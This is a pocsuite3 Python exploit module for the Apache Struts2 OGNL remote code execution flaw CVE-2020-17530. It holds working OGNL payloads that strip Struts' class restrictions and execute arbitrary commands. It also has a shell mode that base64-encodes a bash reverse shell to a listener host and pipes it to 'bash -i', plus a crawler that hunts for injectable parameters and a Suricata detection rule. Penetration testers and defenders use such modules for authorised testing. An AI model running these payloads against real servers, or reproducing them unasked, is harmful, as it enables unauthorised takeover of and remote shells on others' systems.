import base64
import json
from collections import OrderedDict
from urllib.parse import urlparse, urljoin

from lxml import etree

from pocsuite3.api import Output, POCBase, logger, requests, get_listener_ip, get_listener_port
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.core.register import register_poc
from pocsuite3.lib.utils import random_str
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = '99063'  # ssvid
    version = '3.0'
    author = ['']
    vulDate = '2020-12-09'
    createDate = '2020-12-09'
    updateDate = '2020-12-09'
    references = ['https://www.seebug.org/vuldb/ssvid-99063']
    name = 'Apache Struts2 RCE (CVE-2020-17530)'
    appPowerLink = ''
    appName = 'Apache Struts2'
    appVersion = '2.0.0~2.5.25'
    vulType = 'RCE'
    suricata_request = '''http.uri; url_decode; content:"#"; content:".newInstance("; content:".exec(";'''
    suricata_response = ''''''
    desc = '''
    Apache Struts2 061 RCE
    '''
    samples = []
    install_requires = ['']

    def _options(self):
        o = OrderedDict()
        o["param"] = OptString('',
                               description='指定参数，json格式，例如{"param1":"a","param1":"b"}，如果不指定就使用简单爬虫爬取页面链接url进行get请求参数检测，最好指定这个参数，不然爬虫爬取的链接一般是检测不出来的')
        o["method"] = OptString('get', description='指定参数请求方式，get/post')
        o["uriPath"] = OptString('', description='指定uri path')
        return o

    def crawl_url(self):
        resp = requests.get(self.url)
        html = etree.HTML(resp.text)
        links = html.xpath('//a/@href')
        return links if links else []

    def send_payload(self, vul_url, payloads, flag):
        result = {}
        try:
            pr = urlparse(vul_url)
            if pr.port:
                url_path = urljoin("{}://{}:{}".format(pr.scheme, pr.netloc, pr.port), pr.path)
            else:
                url_path = urljoin("{}://{}".format(pr.scheme, pr.netloc), pr.path)

            check = False
            vul_url = url_path
            param_json = {x.split('=')[0]: x.split('=')[1] for x in pr.query.split("&")}

            if pr.query:
                for payload in payloads:
                    for param_ in self.auto_params(param_json, payload):
                        try:
                            resp = requests.get(vul_url, params=param_)
                            if flag in resp.text and "echo" not in resp.text:
                                result['VerifyInfo'] = {}
                                result['VerifyInfo']['URL'] = vul_url
                                result['VerifyInfo']['param'] = param_
                                check = True
                                break
                        except Exception as ex:
                            logger.error(ex)
                    if check: break
        except Exception as ex:
            logger.error(ex)

        return result

    def auto_params(self, params, payload):
        for key, value in params.items():
            params[key] = payload
            yield params
            params[key] = value

    def exploit(self, mode):
        result = {}

        links = [self.url]
        payloads = []
        flag = random_str()
        param = self.get_option("param")
        method = self.get_option("method")
        uriPath = self.get_option("uriPath")

        if mode == "verify" or mode == "attack":
            cmd = "echo {}".format(flag)
        else:
            cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        encode_command = base64.b64encode(cmd.encode()).decode()
        command = "{{echo,{encode_command}}}|{{base64,-d}}|{{bash,-i}}".format(encode_command=encode_command)
        payloads.append(
            "%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'" + cmd + "'}).(#res=#exec.exec(#cmd))}")
        payloads.append(
            "%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'" + command + "'}).(#res=#exec.exec(#cmd))}")

        if param == "":
            links = self.crawl_url()
            for url in links:
                url_parse_1 = urlparse(self.url)
                url_parse_2 = urlparse(url)
                if url_parse_2.netloc and url_parse_2.netloc != url_parse_1.netloc:
                    continue
                result = self.send_payload(urljoin(self.url, url), payloads, flag)
                if result:
                    break
        else:
            param_json = {}
            try:
                param_json = json.loads(param)
            except Exception as ex:
                logger.error("parse param: {} error, {}".format(param, ex))

            if param_json:
                check = False
                vul_url = urljoin(links[0], uriPath)
                for payload in payloads:
                    for param_ in self.auto_params(param_json, payload):
                        try:
                            if method == "get":
                                resp = requests.get(vul_url, params=param_)
                            else:
                                resp = requests.post(vul_url, data=param_)
                            if flag in resp.text and "echo" not in resp.text:
                                result['VerifyInfo'] = {}
                                result['VerifyInfo']['URL'] = vul_url
                                result['VerifyInfo']['param'] = param_
                                check = True
                                break
                        except Exception as ex:
                            logger.error(ex)
                    if check: break

        return result

    def _verify(self):
        result = {}

        try:
            result = self.exploit(mode='verify')
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def _attack(self):
        result = {}

        try:
            result = self.exploit(mode='attack')
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def _shell(self):
        result = {}

        try:
            result = self.exploit(mode='shell')
        except Exception as e:
            logger.error(str(e))
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
